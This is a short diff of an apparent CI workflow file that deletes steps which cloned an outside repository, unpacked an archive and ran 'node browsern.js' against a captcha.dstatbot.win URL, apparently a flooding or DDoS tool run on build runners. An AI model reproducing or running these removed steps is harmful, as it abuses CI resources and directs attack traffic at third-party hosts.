@@ -35,11 +35,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          git clone https://github.com/generalregulator/toomuch.git
-          cd toomuch
-          unzip TEAM.zip
-          cd TEAM
-          node browsern.js  https://captcha.dstatbot.win/QQQCJOto 700 4
+          
 
 
 
